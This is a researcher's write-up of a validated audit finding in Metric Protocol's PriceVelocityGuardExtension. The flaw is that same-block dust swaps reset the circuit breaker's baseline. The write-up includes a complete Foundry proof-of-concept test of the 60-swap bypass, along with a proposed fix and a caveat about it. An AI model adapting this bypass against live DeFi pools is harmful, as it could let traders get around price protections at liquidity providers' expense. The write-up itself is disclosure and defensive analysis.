# Metric Protocol Audit: Breaking the Price Velocity Circuit Breaker

![Severity: Medium](https://img.shields.io/badge/Severity-Medium-orange?style=flat-square)
![Status: Validated](https://img.shields.io/badge/Sherlock-Validated_%E2%9C%85-brightgreen?style=flat-square)
![Contest Rank: #29](https://img.shields.io/badge/Rank-%2329_of_3,307_Submissions-blue?style=flat-square)
![Framework: Foundry](https://img.shields.io/badge/PoC-Foundry-red?style=flat-square)

> **Context:** Back in July 2026, I participated in the **Metric Protocol** public security audit on Sherlock (under `@NicingMan-zzz`). Because Sherlock archives contest issue repositories once judging wraps up, I put this repo together to properly document my validated **Medium** severity finding, the full-pool Foundry integration harness I built to test it, and a subtle fix caveat I noticed after the contest.

---

## TL;DR — The Bug in 30 Seconds

Metric Protocol uses `PriceVelocityGuardExtension` as a `beforeSwap` hook to protect liquidity pools against sudden oracle shocks and rapid price manipulation. According to the contract's specification, it is supposed to **cap how fast the referenced price can move between blocks**.

However, the contract unconditionally overwrote `lastMidPriceX64` and `lastUpdateBlock` on **every single swap call** rather than anchoring the baseline once per block. 

Because of this state overwrite:
1. Any subsequent swap within the **same block** sees `blockDiff = block.number - prevBlock = 0`.
2. That grants the swap a fresh single-block allowance (`allowedSq = maxChange²`) measured against the *immediately preceding swap's price* rather than the block-start price.
3. An attacker (via a multicall or searcher bundle) can chain dozens of tiny "dust" swaps in a single block—walking the tracked price past any admin-configured velocity cap before firing a massive swap in that very same block.

---

## How the Bypass Works

### The Vulnerable Logic

In `PriceVelocityGuardExtension.sol` (`L53-L70`), the extension loads the previous state and immediately overwrites storage before checking `blockDiff`:

```solidity
PriceVelocityState storage s = priceVelocityState[pool_];
uint128 prevMid = s.lastMidPriceX64;
uint64 prevBlock = s.lastUpdateBlock;

// ❌ BUG: Overwritten on every single call, even if we are still in the same block!
s.lastMidPriceX64 = midPrice;
s.lastUpdateBlock = uint64(block.number);

...
uint256 blockDiff = block.number - prevBlock;
...
uint256 allowedSq = uint256(maxChange) * uint256(maxChange) * (1 + blockDiff);
```

### Visualizing the State Drift (Single-Block Walk)

Suppose the pool admin configures `maxChangePerBlockE18 = 1e15` (a strict **0.1% per-block cap**), and a sudden **+5.0% move** occurs in Block `N`.

| Approach | What Happens in Block `N` | `blockDiff` | Reference Baseline | Result |
| :--- | :--- | :--- | :--- | :--- |
| **Single Swap (Intended)** | 1 large swap attempts a +5.0% jump | `1` | Block `N-1` Price (`1.000`) | **Reverts** (`PriceVelocityExceeded`) |
| **Chained Dust Swaps (Bypass)** | 60 dust swaps (100 wei each) step price up by ~0.083% per call | `0` (on calls 2–60) | Previous Call's Price (`1.0008`, `1.0016`, ...) | **Passes** — Guard walks all the way to `+5.0%` in Block `N` |

Once the 60 dust swaps finish walking `s.lastMidPriceX64` up to the shocked price, a whale or MEV searcher can execute the full notional swap in the exact same block without triggering the circuit breaker.

---

## What Happens on the Real Pool? (Testing vs. Theory)

When auditing DeFi protocols, it is easy to mock an isolated contract, prove a bypass, and claim catastrophic fund loss. I wanted to know if bypassing the velocity guard actually bled LP value on a **real deployed `MetricOmmPool`** with genuine bin states and token balances.

I built a 3-part Foundry integration test (`test/PriceVelocityGuardPoolIntegrationPoC.t.sol`) against a pool with `1M / 1M` liquidity and a `1.5%` combined spread fee:

1. **`test_ControlA_SingleFullShockCallReverts`**: Confirmed that a single swap during a ~5% oracle shock properly reverts with `PriceVelocityExceeded`. The math itself works in isolation.
2. **`test_ControlB_SingleLargeSwapBaselineLoss`**: Disabled the guard (`type(uint64).max`) and ran a 900,000 notional swap to see the baseline pool value shift (`2,049,999` $\rightarrow$ `2,050,046`).
3. **`test_Attack_TwoLegCycleBypassesGuardOnRealPool`**: Left the strict `0.1%/block` guard **ACTIVE**, walked the price up 5% in Block 2 using 60 sequential 100-wei dust swaps, and executed the full two-leg cycle (`900,000` swap in and back out).

### The Interesting Takeaway
Both legs of the large swap sailed right through the active guard without reverting. However, in the default test harness configuration (`1.5%` spread fee), the pool's total value actually grew from `2,049,999` to `2,050,280` because the spread fees collected across the 60 dust pings and the two-leg swap outweighed the drift extraction.

Rather than inflating the report, I submitted this transparently as a **broken security control / invariant bypass**—noting that while a `1.5%` fee cushions the pool in test defaults, majors pools with tighter spread fees are exposed when their circuit breaker can be walked for pennies in gas.

---

## Proof of Concept (Foundry)

Below is the cleaned-up integration test wired directly to `MetricOmmPool` and `PriceVelocityGuardExtension`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {MetricOmmPoolBaseTest, Q64} from "./MetricOmmPool.base.t.sol";
import {MetricOmmPool} from "../contracts/MetricOmmPool.sol";
import {PriceVelocityGuardExtension} from "../contracts/extensions/PriceVelocityGuardExtension.sol";
import {BinState} from "../contracts/types/PoolStorage.sol";
import {console} from "forge-std/Test.sol";

contract GuardFactoryStub {
    mapping(address => bool) public isPool;
    mapping(address => address) public poolAdmin;

    function setPool(address pool_, address admin_) external {
        isPool[pool_] = true;
        poolAdmin[pool_] = admin_;
    }
}

contract PriceVelocityGuardPoolIntegrationPoCTest is MetricOmmPoolBaseTest {
    GuardFactoryStub internal guardFactory;
    PriceVelocityGuardExtension internal guard;
    MetricOmmPool internal guardedPool;
    uint256 internal constant USER = 0;

    function setUp() public override {
        super.setUp();
        guardFactory = new GuardFactoryStub();
        guard = new PriceVelocityGuardExtension(address(guardFactory));

        (BinState[] memory nn, BinState[] memory ng) = _defaultBinStateArrays();
        guardedPool = _deployPoolAndRegister(
            PoolDeployParams({
                priceProvider: address(oracle),
                extensions: _singleExtensionPoolExtensions(address(guard)),
                extensionOrders: _extensionOrdersWithBeforeSwap(),
                immutablePriceProvider: true,
                protocolSpreadFeeE6: PROTOCOL_FEE,
                adminSpreadFeeE6: ADMIN_FEE,
                curBinDistFromProvidedPriceE6: 0,
                nonNegativeBinStates: nn,
                negativeBinStates: ng,
                protocolNotionalFeeE8: 0,
                adminNotionalFeeE8: 0,
                immutablePriceProviderForRegistry: address(oracle),
                lowestBin: -1,
                highestBin: 0
            })
        );

        guardFactory.setPool(address(guardedPool), admin);
        pool = guardedPool;
        _approveUsersForPool(address(guardedPool));
        _addLiquidity(USER, -1, 0, 1_000_000, 0);

        oracle.setBidAndAskPrice(uint128(Q64), uint128(Q64 + 1));
        guard.setMaxChangePerBlock(address(guardedPool), 1e15); // strict 0.1%/block cap

        vm.prank(admin);
        guard.setLastMidPrice(address(guardedPool), uint128(Q64));
    }

    /// CONTROL A: A single call spanning the full ~5% shock correctly reverts,
    /// confirming the guard's check logic is sound in isolation.
    function test_ControlA_SingleFullShockCallReverts() public {
        vm.roll(2);
        oracle.setBidAndAskPrice(
            uint128(Q64) + uint128(Q64 * 5 / 100),
            uint128(Q64) + uint128(Q64 * 5 / 100) + 1
        );
        vm.expectRevert();
        _swap(USER, users[USER], true, _i128ExactIn(900_000), 0);
    }

    /// CONTROL B: Identical notional swap with the guard DISABLED, establishing the
    /// baseline change in pool value from the pool's own mechanics alone.
    function test_ControlB_SingleLargeSwapBaselineLoss() public {
        vm.roll(2);
        vm.prank(admin);
        guard.setMaxChangePerBlock(address(guardedPool), type(uint64).max);

        uint128 shockedMid = uint128(Q64) + uint128(Q64 * 5 / 100);
        oracle.setBidAndAskPrice(shockedMid, shockedMid + 1);

        uint256 pool0Before = token0.balanceOf(address(guardedPool));
        uint256 pool1Before = token1.balanceOf(address(guardedPool));

        _swap(USER, users[USER], true, _i128ExactIn(900_000), 0);

        uint256 pool0After = token0.balanceOf(address(guardedPool));
        uint256 pool1After = token1.balanceOf(address(guardedPool));

        uint256 valueBefore = (pool0Before * uint256(shockedMid)) / Q64 + pool1Before;
        uint256 valueAfter = (pool0After * uint256(shockedMid)) / Q64 + pool1After;

        console.log("CONTROL B (guard disabled) value before:", valueBefore);
        console.log("CONTROL B (guard disabled) value after: ", valueAfter);
    }

    /// ATTACK: Guard remains ACTIVE. Walk the oracle price up in 60 small steps,
    /// pinging the guard with a tiny dust swap after each step to reset its baseline
    /// via the same-block accounting gap, then execute the full two-leg cycle.
    function test_Attack_TwoLegCycleBypassesGuardOnRealPool() public {
        vm.roll(2);

        uint128 startMid = uint128(Q64);
        uint128 shockedMid = startMid + uint128(Q64 * 5 / 100);
        uint128 step = (shockedMid - startMid) / 60;

        uint256 pool0Before = token0.balanceOf(address(guardedPool));
        uint256 pool1Before = token1.balanceOf(address(guardedPool));

        for (uint256 i = 1; i <= 60; i++) {
            uint128 currentMid = startMid + (step * uint128(i));
            if (i == 60) currentMid = shockedMid;
            oracle.setBidAndAskPrice(currentMid, currentMid + 1);
            _swap(USER, users[USER], true, _i128ExactIn(100), 0); // dust ping, resets guard baseline
        }

        // Guard is still ACTIVE. Both legs of the cycle now execute without reverting.
        (, int256 a1Leg1) = _swap(USER, users[USER], true, _i128ExactIn(900_000), 0);
        uint128 token1Received = uint128(uint256(a1Leg1 > 0 ? a1Leg1 : -a1Leg1));
        _swap(USER, users[USER], false, _i128ExactIn(token1Received), type(uint128).max);

        uint256 pool0After = token0.balanceOf(address(guardedPool));
        uint256 pool1After = token1.balanceOf(address(guardedPool));

        uint256 valueBefore = (pool0Before * uint256(shockedMid)) / Q64 + pool1Before;
        uint256 valueAfter = (pool0After * uint256(shockedMid)) / Q64 + pool1After;

        console.log("ATTACK (guard bypassed, still active) value before:", valueBefore);
        console.log("ATTACK (guard bypassed, still active) value after: ", valueAfter);
    }
}
```

---

## Fixing It Properly (And a Post-Contest Nuance)

In the original report, the quick mitigation suggested was only updating the baseline when `block.number` advances:

```solidity
if (block.number > s.lastUpdateBlock) {
    s.lastMidPriceX64 = midPrice;
    s.lastUpdateBlock = uint64(block.number);
}
```

### Deeper Engineering Note
If you look closely at how a multi-call block behaves under that one-liner, there is a subtle nuance:
* On the **first swap** of Block `N` (where `block.number > s.lastUpdateBlock`), the check compares `midPrice` against Block `N-1`'s price (`prevMid`), and then sets `s.lastMidPriceX64 = midPrice`.
* On the **second swap** of Block `N`, `blockDiff` is now `0` (`allowedSq = maxChange²`), and `prevMid` is the price from **Swap 1 of Block `N`**, not Block `N-1`. That means Swap 2 could still move the price by *one additional* `maxChange` relative to Swap 1 (giving a maximum of `2x` allowance across the entire block instead of `Nx`, before locking further movement).

To strictly enforce a true per-block ceiling across unlimited intra-block calls, the state struct should anchor the **pre-block reference price** separately from the latest seen price, or only snapshot the previous block's closing price when transitioning into a new block so every swap in Block `N` is evaluated against the exact same `blockStartMidPriceX64` and `blockDiff`.
